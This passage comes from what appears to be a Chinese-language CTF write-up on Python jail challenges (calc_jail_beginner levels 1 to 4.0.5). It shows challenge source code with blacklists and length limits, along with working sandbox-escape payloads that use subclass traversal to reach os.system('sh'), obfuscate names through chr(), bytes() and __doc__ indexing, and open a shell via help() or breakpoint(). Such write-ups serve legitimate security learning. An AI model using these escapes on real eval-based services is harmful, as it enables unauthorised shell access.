&#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;types.GenericAlias&#x27;&gt;, &lt;class &#x27;anext_awaitable&#x27;&gt;, &lt;class &#x27;async_generator_asend&#x27;&gt;, &lt;class &#x27;async_generator_athrow&#x27;&gt;, &lt;class &#x27;async_generator_wrapped_value&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;InterpreterID&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;types.SimpleNamespace&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;weakref.CallableProxyType&#x27;&gt;, &lt;class &#x27;weakref.ProxyType&#x27;&gt;, &lt;class &#x27;weakref.ReferenceType&#x27;&gt;, &lt;class &#x27;types.UnionType&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;BaseException&#x27;&gt;, &lt;class &#x27;hamt&#x27;&gt;, &lt;class &#x27;hamt_array_node&#x27;&gt;, &lt;class &#x27;hamt_bitmap_node&#x27;&gt;, &lt;class &#x27;hamt_collision_node&#x27;&gt;, &lt;class &#x27;keys&#x27;&gt;, &lt;class &#x27;values&#x27;&gt;, &lt;class &#x27;items&#x27;&gt;, &lt;class &#x27;_contextvars.Context&#x27;&gt;, &lt;class &#x27;_contextvars.ContextVar&#x27;&gt;, &lt;class &#x27;_contextvars.Token&#x27;&gt;, &lt;class &#x27;Token.MISSING&#x27;&gt;, &lt;class &#x27;filter&#x27;&gt;, &lt;class &#x27;map&#x27;&gt;, &lt;class &#x27;zip&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &lt;class &#x27;_thread.lock&#x27;&gt;, &lt;class &#x27;_thread.RLock&#x27;&gt;, &lt;class &#x27;_thread._localdummy&#x27;&gt;, &lt;class &#x27;_thread._local&#x27;&gt;, &lt;class &#x27;_io._IOBase&#x27;&gt;, &lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;posix.ScandirIterator&#x27;&gt;, &lt;class &#x27;posix.DirEntry&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;, &lt;class &#x27;codecs.Codec&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;codecs.StreamRecoder&#x27;&gt;, &lt;class &#x27;_abc._abc_data&#x27;&gt;, &lt;class &#x27;abc.ABC&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;collections.abc.Awaitable&#x27;&gt;, &lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;collections.abc.Sized&#x27;&gt;, &lt;class &#x27;collections.abc.Container&#x27;&gt;, &lt;class &#x27;collections.abc.Callable&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;, &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>复制源码下来，ctrl+f对os进行搜索，发现&lt;class ‘os._wrap_close’&gt;可能可以被利用</p>
<p>&lt;class ‘os._wrap_close’&gt;是倒数第四个类，于是我们接下来的利用就是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[&#x27;system&#x27;](&#x27;sh&#x27;)</span><br><span class="line">//反射进入到倒数第四个这个类，然后初始化再用gloabls函数返回对应类里的函数，接着就是进入shell交互</span><br></pre></td></tr></table></figure>

<p>然后就是绕过了，仿照之前的方法进行绕过， 注意要有四个getattr，因为一共是五个魔术方法，其中这个class是不用绕过的，所以用五个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271531427.png?raw=true" alt="image-20240604193049200"></p>
<p>​	因为eval出的结果是有回显的，也可以用之前的另一个payload改</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(chr(102)+chr(108)+chr(97)+chr(103)).read()</span><br></pre></td></tr></table></figure>



<h4 id="calc-jail-beginner-level2"><a href="#calc-jail-beginner-level2" class="headerlink" title="calc_jail_beginner_level2"></a>calc_jail_beginner_level2</h4><p>题目给的附件源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#the length is be limited less than 13</span><br><span class="line">#it seems banned some payload </span><br><span class="line">#Can u escape it?Good luck!</span><br><span class="line"></span><br><span class="line">WELCOME = &#x27;&#x27;&#x27;</span><br><span class="line">  _                _                           _       _ _   _                _ ___  </span><br><span class="line"> | |              (_)                         (_)     (_) | | |              | |__ \ </span><br><span class="line"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |  ) |</span><br><span class="line"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ | / / </span><br><span class="line"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |/ /_ </span><br><span class="line"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____|</span><br><span class="line">              __/ |                          _/ |                                    </span><br><span class="line">             |___/                          |__/                                                                            </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">print(WELCOME)</span><br><span class="line"></span><br><span class="line">print(&quot;Welcome to the python jail&quot;)</span><br><span class="line">print(&quot;Let&#x27;s have an beginner jail of calc&quot;)</span><br><span class="line">print(&quot;Enter your expression and I will evaluate it for you.&quot;)</span><br><span class="line">input_data = input(&quot;&gt; &quot;)</span><br><span class="line">if len(input_data)&gt;13:</span><br><span class="line">    print(&quot;Oh hacker!&quot;)</span><br><span class="line">    exit(0)</span><br><span class="line">print(&#x27;Answer: &#123;&#125;&#x27;.format(eval(input_data)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里可以注意到，我们的payload长度被限制在了13，也就意味着我们无法用很长的编码绕过了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;Welcome to the python jail&quot;)</span><br><span class="line">print(&quot;Let&#x27;s have an beginner jail of calc&quot;)</span><br><span class="line">print(&quot;Enter your expression and I will evaluate it for you.&quot;)</span><br><span class="line">input_data = input(&quot;&gt; &quot;)</span><br><span class="line">if len(input_data)&gt;13:</span><br><span class="line">    print(&quot;Oh hacker!&quot;)</span><br><span class="line">    exit(0)</span><br><span class="line">print(&#x27;Answer: &#123;&#125;&#x27;.format(eval(input_data)))</span><br></pre></td></tr></table></figure>

<p>这里的解法和之前RCE的参数逃逸是一个原理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?cmd=system($_POST[1]);&amp;1=ls</span><br></pre></td></tr></table></figure>

<p>对我们的cmd进行限制，关我们1什么事，在这题当中，我们也可以用同样的原理来达到逃逸的效果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(input())</span><br></pre></td></tr></table></figure>

<p>eval是有回显的，我们在后面这个input当中就能进行rce了</p>
<p>完整payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval(input())</span><br><span class="line">__builtins__.__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)//找flag</span><br><span class="line">__builtins__.__import__(&#x27;os&#x27;).system(&#x27;cat flag&#x27;)//读flag</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271531218.png?raw=true" alt="image-20240604194111205"></p>
<h4 id="calc-jail-beginner-level2-5"><a href="#calc-jail-beginner-level2-5" class="headerlink" title="calc_jail_beginner_level2.5"></a>calc_jail_beginner_level2.5</h4><p>附件源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#the length is be limited less than 13</span><br><span class="line">#it seems banned some payload </span><br><span class="line">#banned some unintend sol</span><br><span class="line">#Can u escape it?Good luck!</span><br><span class="line"></span><br><span class="line">def filter(s):</span><br><span class="line">    BLACKLIST = [&quot;exec&quot;,&quot;input&quot;,&quot;eval&quot;]</span><br><span class="line">    for i in BLACKLIST:</span><br><span class="line">        if i in s:</span><br><span class="line">            print(f&#x27;&#123;i!r&#125; has been banned for security reasons&#x27;)</span><br><span class="line">            exit(0)</span><br><span class="line"></span><br><span class="line">WELCOME = &#x27;&#x27;&#x27;</span><br><span class="line">  _                _                           _       _ _ _                _ ___    _____ </span><br><span class="line"> | |              (_)                         (_)     (_) | |              | |__ \  | ____|</span><br><span class="line"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| |  ) | | |__  </span><br><span class="line"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | |/ _ \ \ / / _ \ | / /  |___ \ </span><br><span class="line"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |/ /_ _ ___) |</span><br><span class="line"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)____/ </span><br><span class="line">              __/ |                          _/ |                                          </span><br><span class="line">             |___/                          |__/                                                                                                            </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">print(WELCOME)</span><br><span class="line"></span><br><span class="line">print(&quot;Welcome to the python jail&quot;)</span><br><span class="line">print(&quot;Let&#x27;s have an beginner jail of calc&quot;)</span><br><span class="line">print(&quot;Enter your expression and I will evaluate it for you.&quot;)</span><br><span class="line">input_data = input(&quot;&gt; &quot;)</span><br><span class="line">filter(input_data)</span><br><span class="line">if len(input_data)&gt;13:</span><br><span class="line">    print(&quot;Oh hacker!&quot;)</span><br><span class="line">    exit(0)</span><br><span class="line">print(&#x27;Answer: &#123;&#125;&#x27;.format(eval(input_data)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>有一个黑名单+长度限制，但是之前做过3了，用help()固然可行，只是有点缺少新东西</p>
<p>我们还可以用breakpoint()</p>
<p>breakpoint之后就会进入到一个叫做pdb的东西当中</p>
<p>​	<em>pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。</em></p>
<p>​	进入pdb当中就能rce了，用之前的payload就能读到flag</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271531635.png?raw=true" alt="image-20240604200800957"></p>
<h4 id="calc-jail-beginner-level3"><a href="#calc-jail-beginner-level3" class="headerlink" title="calc_jail_beginner_level3"></a>calc_jail_beginner_level3</h4><p>附件源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">WELCOME = &#x27;&#x27;&#x27;</span><br><span class="line">  _                _                           _       _ _   _                _ ____  </span><br><span class="line"> | |              (_)                         (_)     (_) | | |              | |___ \ </span><br><span class="line"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | __) |</span><br><span class="line"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ ||__ &lt; </span><br><span class="line"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |___) |</span><br><span class="line"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____/ </span><br><span class="line">              __/ |                          _/ |                                     </span><br><span class="line">             |___/                          |__/                                                                                       </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">print(WELCOME)</span><br><span class="line">#the length is be limited less than 7</span><br><span class="line">#it seems banned some payload </span><br><span class="line">#Can u escape it?Good luck!</span><br><span class="line">print(&quot;Welcome to the python jail&quot;)</span><br><span class="line">print(&quot;Let&#x27;s have an beginner jail of calc&quot;)</span><br><span class="line">print(&quot;Enter your expression and I will evaluate it for you.&quot;)</span><br><span class="line">input_data = input(&quot;&gt; &quot;)</span><br><span class="line">if len(input_data)&gt;7:</span><br><span class="line">    print(&quot;Oh hacker!&quot;)</span><br><span class="line">    exit(0)</span><br><span class="line">print(&#x27;Answer: &#123;&#125;&#x27;.format(eval(input_data)))</span><br></pre></td></tr></table></figure>

<p>这里进一步将我们的payload长度限制到了7</p>
<p>官方给出的解法是help()函数进入交互界面，找到模块输入!+命令就行了</p>
<p>完整payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">help()</span><br><span class="line">os</span><br><span class="line">!ls</span><br><span class="line">!cat flag</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271531614.png?raw=true" alt="image-20240604195125612"></p>
<h4 id="calc-jail-beginner-level4"><a href="#calc-jail-beginner-level4" class="headerlink" title="calc_jail_beginner_level4"></a>calc_jail_beginner_level4</h4><p>题目附件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#No danger function,no chr,Try to hack me!!!!</span><br><span class="line">#Try to read file ./flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BANLIST = [&#x27;__loader__&#x27;, &#x27;__import__&#x27;, &#x27;compile&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;chr&#x27;]</span><br><span class="line"></span><br><span class="line">eval_func = eval</span><br><span class="line"></span><br><span class="line">for m in BANLIST:</span><br><span class="line">    del __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line">del __loader__, __builtins__</span><br><span class="line"></span><br><span class="line">def filter(s):</span><br><span class="line">    not_allowed = set(&#x27;&quot;\&#x27;`&#x27;)</span><br><span class="line">    return any(c in not_allowed for c in s)</span><br><span class="line"></span><br><span class="line">WELCOME = &#x27;&#x27;&#x27;</span><br><span class="line">  _                _                           _       _ _   _                _ _  _   </span><br><span class="line"> | |              (_)                         (_)     (_) | | |              | | || |  </span><br><span class="line"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_ </span><br><span class="line"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _|</span><br><span class="line"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |  </span><br><span class="line"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_|  </span><br><span class="line">              __/ |                          _/ |                                      </span><br><span class="line">             |___/                          |__/                                                                                                                                             </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">print(WELCOME)</span><br><span class="line"></span><br><span class="line">print(&quot;Welcome to the python jail&quot;)</span><br><span class="line">print(&quot;Let&#x27;s have an beginner jail of calc&quot;)</span><br><span class="line">print(&quot;Enter your expression and I will evaluate it for you.&quot;)</span><br><span class="line">input_data = input(&quot;&gt; &quot;)</span><br><span class="line">if filter(input_data):</span><br><span class="line">    print(&quot;Oh hacker!&quot;)</span><br><span class="line">    exit(0)</span><br><span class="line">print(&#x27;Answer: &#123;&#125;&#x27;.format(eval_func(input_data)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>来看黑名单</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BANLIST = [&#x27;__loader__&#x27;, &#x27;__import__&#x27;, &#x27;compile&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;chr&#x27;]</span><br></pre></td></tr></table></figure>

<p>这些都比较常规，能绕一下，但是chr也ban了，这意味着没办法用chr函数和ASCII绕过了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def filter(s):</span><br><span class="line">    not_allowed = set(&#x27;&quot;\&#x27;`&#x27;)</span><br><span class="line">    return any(c in not_allowed for c in s)</span><br></pre></td></tr></table></figure>

<p>单双引号斜杠都被ban</p>
<p>不过之前level1的那个思路还是能得行的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()</span><br><span class="line">//获取当前类——&gt;获取当前类的基类——&gt;返回当前类的所有子类</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271531141.png?raw=true" alt="image-20240605153904137"></p>
<p>看到了老熟人，倒数第四个这个&lt;class ‘os._wrap_close’&gt;</p>
<p>之前我们的思路就是反射出去然后用全局变量拿shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[&#x27;system&#x27;](&#x27;sh&#x27;)</span><br></pre></td></tr></table></figure>

<p>当然在这里我们的单引号双引号都被ban了，需要我们进行一下绕过</p>
<p>绕过的思路有两个</p>
<p><strong>利用bytes</strong></p>
<p>​	bytes()函数能将数字对应的ASCII码进行转换，利用这个我们可以把system和sh这部分给表示出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115, 121, 115, 116, 101, 109]).decode()](bytes([115, 104]).decode())</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\林郑果\AppData\Roaming\Typora\typora-user-images\image-20240605155032859.png" alt="image-20240605155032859"></p>
<p><strong>利用doc魔术方法</strong></p>
<p>doc是类的帮助文档，一般包含了类的一些说明</p>
<p>我们可以用这个doc魔术方法，根据对应的索引拼出来我们的payload</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532595.png?raw=true" alt="image-20240605155746750"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Answer: Built-in immutable sequence.</span><br><span class="line"></span><br><span class="line">If no argument is given, the constructor returns an empty tuple.</span><br><span class="line">If iterable is specified the tuple is initialized from iterable&#x27;s items.</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__doc__[19]就表示了字母s</span><br><span class="line">利用这个原理，我们也可以进行RCE</span><br></pre></td></tr></table></figure>

<p>Payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__doc__[19]+().__doc__[86]+().__doc__[19]+().__doc__[4]+().__doc__[17]+().__doc__[10]](().__doc__[19]+().__doc__[56])</span><br></pre></td></tr></table></figure>

<p>还有一种直接读flag的，如果知道文件名就可以试试看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(&#x27;flag&#x27;).read()//不能直接用，要用上面的方法编码才行</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532012.png?raw=true" alt="image-20240605160232255"></p>
<h4 id="calc-jail-beginner-level4-0-5"><a href="#calc-jail-beginner-level4-0-5" class="headerlink" title="calc_jail_beginner_level4.0.5"></a>calc_jail_beginner_level4.0.5</h4><p>这一题不给附件源码</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532925.png?raw=true" alt="image-20240605160532664"></p>
<p>这种情况，用几个以前的payload探探就老实了</p>
<p>用level4的payload，也就是bytes的ASCII list绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115, 121, 115, 116, 101, 109]).decode()](bytes([115, 104]).decode())</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532244.png?raw=true" alt="image-20240605160715925"></p>
<p>马上出了，但是出于学习的目的，咱都拿到shell了，拖个源码看看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#No danger function,no chr,Try to hack me!!!!</span><br><span class="line">#Try to read file ./flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BANLIST = [&#x27;__loader__&#x27;, &#x27;__import__&#x27;, &#x27;compile&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;chr&#x27;, &#x27;input&#x27;,&#x27;locals&#x27;,&#x27;globals&#x27;]</span><br><span class="line"></span><br><span class="line">my_eval_func_0002321 = eval</span><br><span class="line">my_input_func_2309121 = input</span><br><span class="line"></span><br><span class="line">for m in BANLIST:</span><br><span class="line">    del __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line">del __loader__, __builtins__</span><br><span class="line"></span><br><span class="line">def filter(s):</span><br><span class="line">    not_allowed = set(&#x27;&quot;\&#x27;`&#x27;)</span><br><span class="line">    return any(c in not_allowed for c in s)</span><br><span class="line"></span><br><span class="line">WELCOME = &#x27;&#x27;&#x27;</span><br><span class="line">  _                _                           _       _ _   _                _ _  _    ___   _____ </span><br><span class="line"> | |              (_)                         (_)     (_) | | |              | | || |  / _ \ | ____|</span><br><span class="line"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_| | | || |__  </span><br><span class="line"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _| | | ||___ \ </span><br><span class="line"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_| |_| | ___) |</span><br><span class="line"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)\___(_)____/ </span><br><span class="line">              __/ |                          _/ |                                                   </span><br><span class="line">             |___/                          |__/                                                                                                                                                      </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">print(WELCOME)</span><br><span class="line"></span><br><span class="line">print(&quot;Welcome to the python jail&quot;)</span><br><span class="line">print(&quot;Let&#x27;s have an beginner jail of calc&quot;)</span><br><span class="line">print(&quot;Enter your expression and I will evaluate it for you.&quot;)</span><br><span class="line">print(&quot;Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals and `,\&quot;,&#x27; Good luck!&quot;)</span><br><span class="line">input_data = my_input_func_2309121(&quot;&gt; &quot;)</span><br><span class="line">if filter(input_data):</span><br><span 